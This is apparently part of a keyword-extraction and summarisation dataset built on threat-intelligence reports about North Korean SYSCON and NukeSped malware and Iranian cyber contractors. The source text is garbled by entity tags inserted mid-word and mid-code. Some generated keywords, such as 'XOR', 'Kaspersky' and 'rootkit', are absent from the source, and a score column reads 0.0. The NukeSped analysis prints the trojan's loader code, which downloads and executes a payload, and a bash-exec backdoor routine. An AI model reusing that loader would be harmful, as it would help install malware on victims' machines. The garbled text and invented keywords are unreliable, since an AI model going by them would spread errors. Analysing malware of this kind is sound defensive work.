nihon.byethost3.com\uf104 [ORG] Previous [ORG] Article ( url [DATE] 2018 - mobile - threats - report/)Next Article \uf105 ( url ash - protection- mechanism/)\uf07c Categories : McAfee Labs ( url \uf02c Tags : advanced persistent threats ( url cybersecurity ( url malware ( url Phishing ( url a replyFacebook [WORK_OF_ART] Comments ( 0 ) Comments ( 0 ) [PERSON] G+ [PERSON] CommentsNewsletter [PERSON] Sign [PERSON] UpFirst [PERSON] Name * Last Name * Email Address * Country * --Please Select -- SubmitMcAfee on [PRODUCT] Twitter [PRODUCT] \uf099 [PRODUCT] Follow us on [PERSON] Twitter ( url ( url is using a never - before - seen tactic to get ahold of # [PERSON] Bitcoin ( url#search?q = [PERSON] Bitcoin ) wallets . More on the campaign \u2014 # HaoBao ( url#search?q = HaoBao ) . url ( url hours ago ( 2018/03/03 08:00:05 ) Reply ( url \u00b7 [PERSON] Retweet ( url tweet_id=969844847157895169 ) \u00b7 [PERSON] Favorite ( url ( url [ORG] Honeybee , a campaign leveraging a new variant of the # SYSCON ( url#search ? q = SYSCON ) backdoor , is targeting humanitarian aid orga \u2026 url ( [DATE] url [DATE] day [DATE] ago ( [CARDINAL] 2018/03/02 23:30:06 ) Reply ( url \u00b7 [PERSON] Retweet ( url tweet_id=969716507621167104 ) \u00b7 [PERSON] Favorite ( url ( url always look to bypass new protection mechanisms . More on how # hackers ( url#search?q = hackers ) exploited an # [PERSON] Adobe ( url#search?q = [PERSON] Adobe ) Flash vulnerabi \u2026 url ( [DATE] url [DATE] day [DATE] ago ( [CARDINAL] 2018/03/02 20:05:34 ) Reply ( url \u00b7 [PERSON] Retweet ( url tweet_id=969665033314684929 ) \u00b7 [PERSON] Favorite ( url Article(url ash - protection - mechanism/)McAfee Labs ( url How Hackers Bypassed an Adobe Flash Protection MechanismAbout ( url | Subscribe ( /feed/ ) | Contact & Media Requests ( url#ht = tab - publicrelations ) | Privacy Policy ( url | Legal ( url \u00a9 [DATE] 2018 McAfee LLC\uf099\uf09a\uf0e1\uf167 \uf0d5(url ( url ( url ( url", "generated_text": "Operation Honeybee; humanitarian aid organizations; North Korean political topics; spear; malicious Microsoft Word documents; victims; the implants; South Korea; January 17; February; the campaign; SYSCON; the malware; the macro; a unique key; custom alphabet; data; the user; compromise; the implants; the name; the installer; this malware; the malware; a stolen digital signature; Adobe Systems; the malware; a SYSCON backdoor; code; detection; a stealer; the malware; the Implant; SYSCON backdoor; the SYSCON backdoor; SYSCON-related topics; the attackers; their attacks; information.", "ref_text": "<START-1>The document describes an operation called Operation Honeybee that was discovered by McAfee researchers. The operation involved a malicious document campaign targeting humanitarian aid groups. The malicious documents contained North Korean political themes as lures to get victims to open the documents. Once opened, the documents installed a malware backdoor called SYSCON on the victim's computer. Researchers found that the campaign heavily targeted victims in Vietnam in mid-January 2018. Analysis showed the documents were authored by a Korean speaker. The malware used unique encoding keys that matched previous SYSCON campaigns dating back to August 2017. The malware established persistence on systems and exfiltrated data like system info and running processes back to a command server. The malware variants used new droppers not seen before, indicating the threat actors created new tools specific for this campaign. The malware bypassed Windows UAC protections in its installation process. In addition to Vietnam, researchers saw targeting in South Korea, Singapore, Argentina, Japan, Indonesia, and Canada. The campaign specifically went after those involved in humanitarian aid and North/South Korean affairs. The report provides IOCs like file hashes, domain names, and MITRE ATT&CK techniques used by the malware. It concludes that this was a unique operation using custom malware to target a specific set of victims related to Korea issues and aid groups. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5183374083129584, "gpt3/lexical/rouge_rouge2": 0.1081081081081081, "gpt3/lexical/rouge_rougeL": 0.2493887530562347, "gpt3/lexical/rouge_rougeLsum": 0.2493887530562347, "gpt3_generated_text": ["McAfee researchers have uncovered a new operation called \"Operation Honeybee\" that targets humanitarian aid organizations. The attackers use malicious Microsoft Word documents with North Korean political topics as bait to lure victims into opening them. The operation involves the use of a backdoor called SYSCON, which was first discovered in 2017 in Word documents related to North Korea. The documents contain a Visual Basic macro that drops and executes an upgraded version of the SYSCON implant. The attackers have also used a unique key to encode data, which has been used since August 2017. The researchers have found several decoy documents, most of which were submitted from South Korea, indicating some targeting in that country. The operation also involves the use of a Win32 executable dropper that pretends to be a Word document and drops the same type of malware as the Word documents. The dropper uses a stolen digital signature from Adobe Systems. The researchers have identified a persona tied to this operation and have observed the actor registering free hosting accounts for control servers. The article provides a technical analysis of the attack and its components."]}, {"split_name": "val", "sample_id": "val_132", "prompt_text": "Extract the keywords: [ORG] objective-see.org /blog / blog_0x6E.htmlFrom The DPRK With Love - analyzing a recent north korean macOS backdoorby : [PERSON] Patrick [PERSON] Wardle / [DATE] May [DATE] 9 , 2022BackgroundIn [DATE] mid [DATE] April , [ORG] the [ORG] Cybersecurity [ORG] & [ORG] Infrastructure [ORG] Security [ORG] Agency ( [ORG] CISA ) published a report detailing \" [ A ] [NORP] North [NORP] Korean State - Sponsored APT Target[ing ] Blockchain Companies\":The report begins with an informative overview of both the targets of , and techniques used the [NORP] North [NORP] Korean cyber actor ( publicly known as [ORG] Lazarus [ORG] Group or APT38).The [GPE] U.S. government has observed [NORP] North [NORP] Korean cyber actors targeting a variety of organizations in the blockchain technology and cryptocurrency industry The activity described in this advisory involves social engineering of victims using a variety of communication platforms to encourage individuals to download trojanized cryptocurrency applications on Windows or macOS operating systems . The cyber actors then use the applications to gain access to the victim \u2019s computer , propagate malware across the victim \u2019s network environment , and steal private keys or exploit other security gaps . These activities enable additional follow - on activities that initiate fraudulent blockchain transactions . -CISAMoreover , the report also ( albeit rather briefly ) describes the malicious applications targeting both Windows and Mac . The macOS samples listed in the CISA report , include : DAFOM-1.0.0.dmg TokenAIS.app.zip Specifically we \u2019ll focus on a sample distributed within a trojanized application named Esilet . Esilet : 1st - Stage The propensity of [NORP] the [NORP] North [NORP] Koreans to target the cryptocurrency community via trojanized application is not new . Previous research on this includes : The CISA report notes that \" Esilet claims to offer live cryptocurrency prices and price predictions\" . Objective - See : OSX.WatchCat [ORG] SentinelOne : [CARDINAL] Four Distinct Families of [ORG] Lazarus [ORG] Malware [ORG] Target Apple [ORG] \u2019s macOS Platform \u2026 which can be confirmed by running the ( trojanized ) application in a isolated Virtual Machine : The application is distributed via a disk image , named Esilet.dmg : [PRODUCT] % [PRODUCT] du -h ~/Malware / [ORG] NukeSped / Esilet.dmg 78 M /Users / patrick / [PERSON] Malware / NukeSped / Esilet.dmg% shasum -a256 ~/Malware / [ORG] NukeSped / Esilet.dmg detections have ( somewhat ) increased since then : Esilet.dmg on VirusTotalYou can mount the disk image ( via hdiutil ) , to extract its files : hdiutil attach /Users / patrick / Malware / TraderTraitor / Esilet.dmg -noverify / dev / disk6 GUID_partition_scheme /dev / disk6s1 Apple_HFS /Volumes / Esilet% ls /Volumes / Esilet Esilet.appOpening the mounted disk image ( /Volumes / Esilet ) in [NORP] Finder reveals a application , named Esilet.app:3/18The application is not signed , and via the file utility we see its main executable is a standard [QUANTITY] 64 - bit Mach - O binary ( named [WORK_OF_ART] Esilet ): % codesign -dvv /Volumes / [ORG] Esilet / Esilet.app /Volumes / [ORG] Esilet / Esilet.app : code object is not signed at [ORG] all% file /Volumes / [ORG] Esilet / Esilet.app / Contents / MacOS / [ORG] Esilet /Volumes / [ORG] Esilet / Esilet.app / Contents / MacOS / [ORG] Esilet : Mach - O [CARDINAL] 64 - bit executable x86_644/18We can confirm CISA \u2019s findings that application is an [PERSON] Electon application , by looking at Esilet.app [ORG] \u2019s dependencies via otool ( noting [ORG] Electron Framework.framework ): % otool -L /Volumes / [ORG] Esilet / Esilet.app / Contents / MacOS / [ORG] Esilet /Volumes / [ORG] Esilet / Esilet.app / Contents / MacOS / Esilet:/System / Library / Frameworks / MediaPlayer.framework / Versions / A / MediaPlayer @rpath / [ORG] Electron Framework.framework/Electron Framework From a reversing point of view , this is good news . Why ? Electron applications are rather trivial to analyze , [PERSON] Electon is , \u201c a framework for creating native applications with web technologies like [PRODUCT] JavaScript , HTML , as they ( always ? ) ship with their original ( JavaScript ) source code . However this code may be archived and CSS . \u201d and thus , must [ORDINAL] first be unpacked . To learn more about [PERSON] Electon , head over to : If an [ORG] Electron application is packed , the archive format is asar . From the asar github repo:\"Asar is a simple extensive archive format , it works like tar that concatenates all files together without compression , while having random access support . \"ElectronJS.org . As noted in a StackOver post titled , \u201c How to unpack an .asar file ? \u201d one can unpack an asar archive via the following : npx asar extract app.asar destfolder . In the Esilet.app we find an asar archive ( app.asar ) in Contents / Resources/ and extract it in the following manner : $ npx asar extract Esilet.app/Contents/Resources/app.asar asar(unpacked)The extracted archive contains various files , most notably several JavaScript files:5/18The CISA report notes:\"It contains a simpler version of TraderTraitor code in a function exported as UpdateCheckSync ( ) located in a file named update.js , which is bundled in [GPE] renderer.prod.js , which is in the app.asar archive . \" -CISALet \u2019s take a peek at the ( beautified ) renderer.prod.js files , specifically looking at the UpdateCheckSync function:1\"./app / update.js \" : function(e , t , r ) { [CARDINAL] 2 async function i ( ) { [CARDINAL] 3 var e = \" / \" ; [CARDINAL] 4 \" win32 \" = = r(\"os\").platform().toLowerCase ( ) [ORG] & [ORG] & ( e = \" \\\\ \" ) ; [CARDINAL] 5 var t = r(\"os\").tmpdir ( ) , [CARDINAL] 6 i = \" url \" + r(\"os\").platform ( ) + \" .json \" , [CARDINAL] 7 n = t + e + \" Esilet - tmp \" + Math.random().toString(36).substring(8 ) ; [CARDINAL] 8 \" \\\\ \" = = e [ORG] & [ORG] & ( n + = \" .exe \" ) ; [CARDINAL] 9 var o = t + e + \" noEsilet-0000 \" ; [CARDINAL] 10 try { [DATE] 11 if ( r(\"fs\").existsSync(o ) ) return ; [CARDINAL] 12 request = [ORG] r(\"./app / node_modules / request / index.js \" ) , request ( { 13 rejectUnauthorized : ! [CARDINAL] 1 , [CARDINAL] 14 url : i [CARDINAL] 15 } , ( function(t , i , o ) { [CARDINAL] 6/1816 if ( t || ! i || [CARDINAL] 200 ! = i.statusCode ) return ; [CARDINAL] 17 var a = \" url \" + JSON.parse(o).path ; [CARDINAL] 18 let s = r(\"fs\").createWriteStream(n ) ; [CARDINAL] 19 request ( { 20 rejectUnauthorized : ! [CARDINAL] 1 , [CARDINAL] 21 url : a , [CARDINAL] 22 gzip : ! 0 [CARDINAL] 23 } ) .pipe(s).on(\"finish \" , ( ) = > { [DATE] 24 \" \\\\ \" ! = e [ORG] & [ORG] & [ORG] r(\"fs\").chmodSync(n , [CARDINAL] 511 ) , r(\"child_process\").exec(n ) , setTimeout((function ( ) { [QUANTITY] 25 [QUANTITY] console.log(n ) , r(\"child_process\").exec(n ) , console.log(n ) [CARDINAL] 26 } ) , [CARDINAL] 12e3 ) [CARDINAL] 27 } ) .on(\"error \" , e = > { } ) [CARDINAL] 28 } ) ) [CARDINAL] 29 } catch ( e ) { } [CARDINAL] 30 } [CARDINAL] 31 e.exports = { [CARDINAL] 32 UpdateCheckSync : i , [CARDINAL] 33 UpdateCheckAsync : async function ( ) { [CARDINAL] 34 await new Promise(e = > { [CARDINAL] 39 } , This code will be automatically executed when the user opens the trojanized application . The most relevant logic of the UpdateCheckSync function can be found around line [CARDINAL] 17 . Here you can see the code builds a url ( base url : url and then makes a request which is written out ( to a path found in the n variable).On line [CARDINAL] 24 , this downloaded file is executed , via exec(n).And what is downloaded ( and executed ) ? The CISA report states:[the application ] has been observed delivering payloads of [CARDINAL] at [CARDINAL] least [CARDINAL] two different macOS variants of [GPE] Manuscrypt \" -CISALet \u2019s now take a look at [FAC] the [FAC] Manuscrypt ( Nukesped ) backdoor . Esilet : [DATE] 2nd - StageAs the [ORG] CISA report provides several hashes for what they refer to as the \u201c Manuscrypt \u201d backdoor . ( We \u2019ll stick with \u201c [PRODUCT] NukeSped \u201d , which seems to be the name that public AV - engines prefer).7/18The binary we \u2019ll focus on is named Esilet - tmpg7lpp . It is an unsigned [CARDINAL] 64 - bit Mach - O binary : % shasum -a256 ~/Malware / [ORG] NukeSped / [ORG] Esilet - tmpg7lpp [ORG] Esilet - tmpg7lpp : Mach - O [CARDINAL] 64 - bit executable x86_64 [PERCENT] % codesign -dvv Esilet - tmpg7lpp Esilet - tmpg7lpp : code object is not signed at allThe binary was originally submitted to [ORG] VirusTotal in [DATE] late [DATE] 2020 ( via one of Objective - See \u2019s tools , which allows users to submit files directly to [ORG] VirusTotal ) . Although it was originally undetected , detections have ( somewhat ) increased since then : Esilet - tmpg7lpp on VirusTotalWhen triaging an unknown ( possibly ) malicious binary , running strings ( to extract , well , strings ) can reveal a myriad of information : % strings - Esilet - tmpg7lppMozilla/5.0 ( [ORG] Macintosh ; [ORG] Intel [ORG] Mac [ORG] OS [ORG] X [ORG] 10_9_3 ) AppleWebKit/537.75.14 ( [ORG] KHTML , like [GPE] Gecko ) Version/7.0.3 [PERSON] Safari/7046A194A [PERSON] Mozilla/5.0 ( [ORG] Macintosh ; [ORG] Intel [ORG] Mac [ORG] OS [ORG] X [ORG] 10_6_8 ) AppleWebKit/537.13 + ( [ORG] KHTML , like [GPE] Gecko ) Version/5.1.7 Safari/534.57.2 Mozilla/5.0 ( [ORG] Macintosh ; [ORG] Intel [ORG] Mac [ORG] OS [ORG] X [ORG] 10_7_3 ) AppleWebKit/534.55.3 ( [ORG] KHTML , like [GPE] Gecko ) [ORG] Version/5.1.3 [ORG] Safari/534.53.10 [ORG] Cookie : _ ga=%s%02d%d%d%02d%s ; gid=%s%02d%d%03d%s8/18Content - Type : application / octet - stream Content - Length : % d User - Agent : % s Cache - Control : no - cache Pragma : no - cache Connection : keep - alive < ? xml version=\"1.0 \" encoding=\"UTF-8 \" ? > < ! DOCTYPE plist PUBLIC \" -//Apple//DTD PLIST 1.0//EN \" \" url \" > < plist version=\"1.0 \" > < dict > < key > Label</key > < string > com.%s.agent</string > < key > ProgramArguments</key > < array > < string>%s</string > < string > daemon</string > < /array > < key > KeepAlive</key > < false/ > < key > RunAtLoad</key > /Library / LaunchDaemons / com.%s.agent.plist [ORG] % s / Library / LaunchAgents / com.%s.agent.plist [ORG] ProductVersion : % d.%d.%d networksetup -getwebproxy ' % s ' [ORG] applex.services.agent9/18 url url url @_writeSolely from the strings output we can glean various information ( that sure , should be be fully confirmed via continued analysis):User - agent strings used by the binary HTTP headers used by the binary , including ( custom ? ) cookie values An embedded launch item property list Path for the launch item property list [ORG] Shell commands likely for generating a survey URLs , likely command and control ( or exfil ) servers curl - related APIs for networking communications API related to executing commands , reading / writing files , etc . etc.10/18In short , it appears the the [ORG] Esilet - tmpg7lpp is a persistent backdoor , that affords remote attackers continued access and capabilities on an infected system . Ok , enough static analysis , let \u2019s run [ORG] Esilet - tmpg7lpp ( in an isolated VM ) and see what it does ! [ORG] The [ORG] Lazarus [ORG] Group are rather fond of using the libcurl APIs to provide networking capabilities for their [ORG] Unsurprisingly , at least at the [ORG] UI level , nothing appears amiss : implants / backdoors ( e.g. OSX.WatchCat). \u2026 behind the scenes though , is another storyVial a File Monitor we can passively observe the malware persisting itself as a launch item ( agent ): # [PRODUCT] FileMonitor.app/Contents/MacOS/FileMonitor \" timestamp \" : \" 2022 - 05 - 08 07:44:28 +0000 \" , \" /Users / user / Library / LaunchAgents / com.applex.services.agent.agent.plist \" , \" path \" : \" /Users / user / Desktop / [ORG] Esilet - tmpg7lpp \" , \" uid \" : [CARDINAL] 501 , \" arguments \" : [ \" /Users / user / Desktop / [ORG] Esilet - tmpg7lpp \" ] , \" ppid \" : [DATE] 1380 , \" ancestors \" : [ 1380 , [DATE] 1379 , [DATE] 1377 , [CARDINAL] 1 ] , \" signing info ( reported ) \" : { \" csFlags \" : [CARDINAL] 0,11/18\"platformBinary \" : [CARDINAL] 0 , \" signing info ( computed ) \" : { \" timestamp \" : \" 2022 - 05 - 08 07:44:28 +0000 \" , \" /Users / user / Library / LaunchAgents / com.applex.services.agent.agent.plist \" , \" path \" : \" /Users / user / Desktop / [ORG] Esilet - tmpg7lpp \" , \" uid \" : [CARDINAL] 501 , \" arguments \" : [ \" /Users / user / Desktop / [ORG] Esilet - tmpg7lpp \" ] , \" ppid \" : [DATE] 1380 , \" ancestors \" : [ 1380 , [DATE] 1379 , [DATE] 1377 , [CARDINAL] 1 ] , \" signing info ( reported ) \" : { \" signing info ( computed ) \" : { } We can examine the malware \u2019s ( now - created ) launch agent property list ( ~/Library / LaunchAgents / com.applex.services.agent.agent.plist)1<?xml version=\"1.0 \" encoding=\"UTF-8 \" ? > 2<!DOCTYPE plist PUBLIC \" -//Apple//DTD PLIST 1.0//EN \" > 12/183 < plist version=\"1.0 \" > 4 < dict > 5 < key > Label</key > 6 < string > com.applex.services.agent.agent</string > 7 < key > ProgramArguments</key > 8 < array > 9 < string>/Users / user / Desktop / [ORG] Esilet - tmpg7lpp</string > 10 < string > daemon</string > 11 < /array > 12 < key > KeepAlive</key > 13 < false/ > 14 < key > RunAtLoad</key > 17</plist > Its a pretty standard persistent launch agent with : [PERSON] Name ( [PERSON] Label ): com.applex.services.agent.agent Path : Location where the malware was executed ( e.g. ~/Desktop / [WORK_OF_ART] Esilet - tmpg7lpp ) RunAtLoad : Set to true ensuring the malware will be automatically ( re)started each time the user logs in . Next , the malware attempts to beacon out to ( one of ) its command and control server for tasking . For example , it was observed attempting to connect to www.vinoymas.ch ( which resolved to : capabilities . For example at 0x0000000100004A50 we find a function that after connecting to the server , contains a large switch statement that appears invoke various functions , based on commands received from the the server.__text:0000000100004B52 mov ecx , eax _ _ text:0000000100004B54 sub ecx , [CARDINAL] 21279Eh _ _ text:0000000100004B5A mov [ rbp+task ? ] , eax _ _ [CARDINAL] text:0000000100004B5D jz loc_100004C80 _ _ text:0000000100004B63 jmp $ +5 _ _ [CARDINAL] text:0000000100004B68 loc_100004B68 : _ _ text:0000000100004B68 mov eax , [ rbp+task ? ] _ _ text:0000000100004B6B sub eax , [CARDINAL] 2AFCB2h13/18__text:0000000100004B70 jz loc_100004C13 _ _ [CARDINAL] text:0000000100004B76 jmp $ +5 _ _ text:0000000100004B7B loc_100004B7B : _ _ text:0000000100004B7B mov eax , [ rbp+task ? ] _ _ text:0000000100004B7E sub eax , [CARDINAL] 38CE55h _ _ text:0000000100004B83 jz loc_100004C3A _ _ text:0000000100004B89 jmp $ +5 _ _ text:0000000100004B8E loc_100004B8E : _ _ text:0000000100004B8E mov eax , [ rbp+task ? ] _ _ text:0000000100004B91 sub eax , 3A65F8h _ _ [CARDINAL] text:0000000100004B96 jz loc_100004D3F _ _ text:0000000100004B9C jmp $ +5 _ _ text:0000000100004BA1 loc_100004BA1 : _ _ text:0000000100004BA1 mov eax , [ rbp+task ? ] _ _ text:0000000100004BA4 sub eax , 3A6A93h _ _ text:0000000100004BA9 jz loc_100004C5D _ _ text:0000000100004BAF jmp $ +5For example , if the instruction at line 0x0000000100004B6B ( sub eax , 2AFCB2h , which operates on the tasking command from the server ) , results in a [CARDINAL] zero ( e.g. a match ) , the jz ( jump if [CARDINAL] zero flag is set ) will be taken:__text:0000000100004B68 mov eax , [ rbp+task ? ] _ _ text:0000000100004B6B sub eax , [CARDINAL] 2AFCB2h _ _ text:0000000100004B70 jz loc_100004C13The jump destination is loc_100004C13 which shortly thereafter calls a subroutine found at 0x0000000100002920This subroutine calls various other subroutines to generate an survey of the infected system . For example a subroutine at [CARDINAL] 0x0000000100004060 executes the sw_vers shell command to determine the ( product and build ) version of [ORG] system:1var_2D0 = popen(\"sw_vers \" , \" r \" ) ; [ORDINAL] 2if ( var_2D0 ! = [CARDINAL] 0x0 ) { [CARDINAL] 3 rax = [CARDINAL] fgets(&var_210 , [CARDINAL] 0x200 , var_2D0 ) ; [CARDINAL] 4 if ( rax ! = [CARDINAL] 0x0 ) { 14/185 rax = [CARDINAL] fgets(&var_210 , [CARDINAL] 0x200 , var_2D0 ) ; [CARDINAL] 6 if ( rax ! = [CARDINAL] 0x0 ) { 7 sub_100003d30(&var_210 ) ; [CARDINAL] 8 rax = sscanf(&var_210 , \" ProductVersion : % d.%d.%d \" ) ; [CARDINAL] 9 var_2B4 = rax ; [CARDINAL] 10 if ( var_2B4 = = 0x3 ) { [CARDINAL] 11 * ( int32_t * ) var_298 = [CARDINAL] 0x0 ; [CARDINAL] 12 * ( int32_t * ) var_2A0 = [CARDINAL] 0x0 ; [CARDINAL] 13 rax = [CARDINAL] fgets(&var_210 , [CARDINAL] 0x200 , var_2D0 ) ; [CARDINAL] 14 if ( rax ! = [CARDINAL] 0x0 ) { [CARDINAL] 15 sub_100003d30(&var_210 ) ; [CARDINAL] 16 rax = sscanf(&var_210 , \" BuildVersion : % x \" ) ; [CARDINAL] 17 var_2B4 = rax ; [CARDINAL] 18 if ( var_2B4 = = [GPE] 0x1 ) { [CARDINAL] 19 * ( int32_t * ) var_2A8 = [CARDINAL] 0x0 ; [CARDINAL] 20 var_2B4 = [GPE] 0x1 ; [CARDINAL] 26} \u2026 thus we know the backdoor can be remotely tasked to generate a survey of an infected system . Another taskable subroutine is found at [CARDINAL] 0x00000001000036A0 . It contains code to execute a shellcommand ( or script ) via /bin / bash -c:1;sub_1000036a0 [CARDINAL] 4 var_74 = fork ( ) ; [CARDINAL] 5 if ( var_74 > = 0x0 ) goto loc_100003755 ; [CARDINAL] 6 goto loc_100003bb0 ; [CARDINAL] 9 if ( [CARDINAL] 0x0 = = var_74 ) { 10 close(var_10 ) ; [CARDINAL] 11 if ( dup2(var_C , [GPE] 0x1 ) < 0x0 ) { [CARDINAL] 12 exit(*(int32_t * ) error ( ) ) ; [CARDINAL] 13 } [CARDINAL] 14 if ( dup2(var_C , 0x2 ) < 0x0 ) { [CARDINAL] 15 exit(*(int32_t * ) error());15/1816 } [CARDINAL] 17 var_30 = \" /bin / bash \" ; [CARDINAL] 18 rax = execv(var_30 , & var_30 ) ; [CARDINAL] 19 if ( rax < 0x0 ) { [CARDINAL] 20 exit(*(int32_t * ) error ( ) ) ; [CARDINAL] 21 } [CARDINAL] 22 exit(0x0 ) ; [CARDINAL] 23 } This affords remote attacker the ability to execute arbitrary commands on an infected system . Other taskable commands are what one would expect in a persistent backdoor ( e.g. file read ( and exfil ) , file write , etc . etc.).Esilet vs. Objective - See [ORG] \u2019s [ORG] ToolsWhenever new malware is uncovered , part of that analysis is to see how it stacks up against Objective- See \u2019s free , open - source macOS security tools. \u2026 and if our tools do n\u2019t fully detect or mitigate the malware , we then know how they can be improved!First off , let [GPE] \u2019s talk about [ORG] KnockKnock which enumerates persistently installed software to detect any persistent malware . Good news , when run , [ORG] KnockKnock easily uncovers and flags the malware \u2019s launch agent : [ORG] KnockKnock who 's there?The metadata from the submission to [ORG] VirusTotal reveals that the [ORG] Esilet - tmpg7lpp binary , was initially [ORG] Next , we have [ORG] BlockBlock which monitors several common persistence locations . Its goal is to , at submitted via one of Objective - See 's tools ! How cool ! ? [ORG] \ud83e\udd17 runtime , detect any malware that attempts to persist . And again , good news , [ORG] BlockBlock detect the16/18malware when it attempts to persist as a launch agent When the tools detect something suspicious , the user can submitted the item to [ORG] VirusTotal for analysis . ( ~/Library / LaunchAgents / com.applex.services.agent.agent.plist):BlockBlock block , blocking!Finally , we have [LOC] LuLu our firewall , that can alert you about unauthorized network connections . And yes , it will alert you when the malware attempts to connect to its command and control server for tasking : [LOC] LuLu , unauthorized network [ORG] alertConclusion17/18A recent [GPE] CISA report provided a comprehensive overview of recent [NORP] North [NORP] Korean ( [ORG] Lazarus [ORG] Group ) hacking techniques and tools . In this blog post , we dove deeper into the macOS malware used in these attacks , further detailing the malware \u2019s 1st and [ORDINAL] 2nd stage components , including persistence and capabilities . Finally we showed how Objective - See \u2019s heuristic - based tools easy thwarted this malware , even with no a priori knowledge!18/18", "generated_text": "a report; CISA; North Korean; APT38; a trojanized cryptocurrency application; Detect; malware; the victim; MacOS; trojanized cryptocurrency applications; Windows; macOS; Esilet.dmg; a disk image; Overlap; malware; XOR; a list; vulnerabilities; a trojanized app; the malware; the cryptographic community; the rootkit; security gaps; the North Koreans; a combination; Kaspersky; the CISA report; evasion; social engineering; the report; the cryptocurrency community; the cyber actors; support; security holes; cryptanalysis; use; espionage; business; intrusion; compromise; indicators; compromise; detection; malicious code; techniques; the North Korean groups; the cryptocurrency community.", "ref_text": "<START-1>The blog post analyzes a recent macOS malware sample called NukeSped distributed by the North Korean Lazarus Group. It is delivered in two stages - first via a trojanized cryptocurrency app, then by downloading the backdoor NukeSped. The initial app Esilet uses an Electron framework and JavaScript to check for updates which downloads the next stage malware. NukeSped persists as a launch agent and uses libcurl networking APIs to communicate with command and control servers. Analysis of NukeSped shows it is a full-featured backdoor capable of surveying the system, executing arbitrary commands, reading/writing files, and more based on commands from the C2 server. The author demonstrates how existing macOS security tools like KnockKnock, BlockBlock, and LuLu detect the malware's behaviors like persistence and network connections even without prior knowledge of this new threat. The tools provide effective heuristic detection and can block the malware. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.3957597173144876, "gpt3/lexical/rouge_rouge2": 0.0711743772241993, "gpt3/lexical/rouge_rougeL": 0.19081272084805656, "gpt3/lexical/rouge_rougeLsum": 0.19081272084805656, "gpt3_generated_text": ["This article discusses a recent report by the Cybersecurity & Infrastructure Security Agency (CISA) that details the targeting of blockchain companies by North Korean state-sponsored APT group, Lazarus Group or APT38. The report highlights the use of trojanized cryptocurrency applications to gain access to victims' computers, propagate malware, and steal private keys or exploit security gaps to initiate fraudulent blockchain transactions. The article focuses on a specific sample of trojanized application named Esilet, distributed via a disk image called Esilet.dmg. The article provides details on the analysis of the application, including its dependencies and the fact that it is an Electron application, making it relatively easy to analyze. The article emphasizes the need for detection and protection against such malware targeting the cryptocurrency community and highlights the importance of cybersecurity measures to prevent compromise and intrusion."]}, {"split_name": "val", "sample_id": "val_133", "prompt_text": "Extract the keywords: [ORG] CYBER [ORG] THREAT ANALYSISIran \u2019s Hacker Hierarchy ExposedHow [GPE] the [GPE] Islamic [GPE] Republic [GPE] of [GPE] Iran [GPE] Uses [GPE] Contractors and Universities to Conduct Cyber OperationsBy [PERSON] Levi [PERSON] Gundert , [PERSON] Sanil [PERSON] Chohan , and [PERSON] Greg [PERSON] Lesnewich Recorded FutureRecorded Future | www.recordedfuture.com | CTA-2018 - 0509Scope Note : [ORG] Insikt [ORG] Group conducted interviews with a former [NORP] Iranian hacker with [ORDINAL] first - hand knowledge of the information shared and was living in [GPE] Iran when he started [CARDINAL] one of [GPE] Iran \u2019s [ORDINAL] first security forums . This source \u2019s commentary forms the basis for the background on the genesis of [GPE] Iran \u2019s offensive cyber efforts . Additional research was facilitated with [ORG] Recorded [ORG] Future and by leveraging third- party metadata and open source intelligence ( OSINT ) techniques using a variety of tools . While we address historical background and precedent in the piece , the technical analysis regarding organizations and institutes in [GPE] Iran \u2019s offensive cyber program is based on data collected from [DATE] March 1 , [DATE] 2018 to [DATE] April [DATE] 30 , [CARDINAL] 2018.Executive SummarySince at least 2009 , [GPE] the [GPE] Islamic [GPE] Republic [GPE] of [GPE] Iran has regularly responded to sanctions or perceived provocations by conducting offensive cyber campaigns . [GPE] The [GPE] Islamic [GPE] Republic has historically preferred to use proxies or front organizations both in physical conflict \u2014 [ORG] Hezbollah against [GPE] Israel and [GPE] Yemen rebels against [GPE] Saudi [GPE] Arabia \u2014 and cyberattacks to achieve their policy goals . Currently , [GPE] Iran faces the prospect of negative economic impact via renewed sanctions . On [DATE] May 8 , [DATE] 2018 President [PERSON] Trump announced that [GPE] the [GPE] United [GPE] States would not renew the waivers on sanctions against [GPE] Iran . The [GPE] U.S will instead impose additional economic penalties , the combination of which amounts to a de facto [GPE] U.S. withdrawal from the [DATE] 2015 Joint Comprehensive Plan of Action ( JCPOA ) ( commonly referred to as the \u201c [GPE] Iran nuclear deal\u201d . We assess , based on [GPE] Iran \u2019s previous reactions to economic pressure , that with President [PERSON] Trump \u2019s exit from the JCPOA , [GPE] Iran is likely to respond by launching cyberattacks on Western businesses within [DATE] months , if not faster . Judging from historical patterns , the businesses likely to be at greatest risk are in many of the same sectors that were victimized by [NORP] Iranian cyberattacks [DATE] between [DATE] 2012 [DATE] and [DATE] 2014 and include banks and financial services , government departments , critical infrastructure providers , and oil and energy . Key Judgments\u2022\u2022The Islamic Republic has abandoned its typically deliberate and methodical approach to cyber operations on [CARDINAL] only [CARDINAL] two known occasions , in [DATE] 2012 and in [DATE] 2014 , when a quick reactionary response was required . We assess that when [NORP] Iranian cyber operators respond to the [GPE] U.S. withdrawal from the JCPOA that the operations will be staffed and executed by capable , but less trusted contractors . Further , we assess that staffing these operations with less trusted contractors could result in a scenario where [GPE] the [GPE] Islamic [GPE] Republic has difficulty controlling the scope and scale of the destructive cyberattacks once they have begun . [ORG] Recorded [ORG] Future | www.recordedfuture.com | CTA-2018 - 0509\u2022\u2022Iranian cyber operations are administered via a tiered approach , where an ideologically and politically trusted group of middle managers translate intelligence priorities into segmented cyber tasks which are then bid out to multiple contractors . This creates a quasi - capitalistic system that pits contractors against each other for influence with the [NORP] Iranian government . [GPE] The [GPE] Islamic [GPE] Republic operates with embedded paranoia , where ultimately , no one can be trusted . The situation creates unique trade - offs in [GPE] Iran \u2019s government - sanctioned offensive cyber campaigns ; individuals with demonstrated adherence to the government \u2019s ideology and individuals with the greatest offensive cyber skills are almost always mutually exclusive.\u2022 Based on our source \u2019s conversations with other hackers inIran , there are over 50 estimated contractors vying for [NORP] Iranian government - sponsored offensive cyber projects . Only the best individuals or teams succeed , are paid , and remain in business.\u2022\u2022Insikt [ORG] Group analyzed internet traffic relating to various institutes affiliated with the [NORP] Iranian cyber ecosystem from [DATE] March 1 , [DATE] 2018 to [DATE] April [DATE] 30 , [DATE] 2018 . As this is the [ORDINAL] first profiling of [NORP] Iranian internet activity for these institutes , we can not determine whether the suspicious 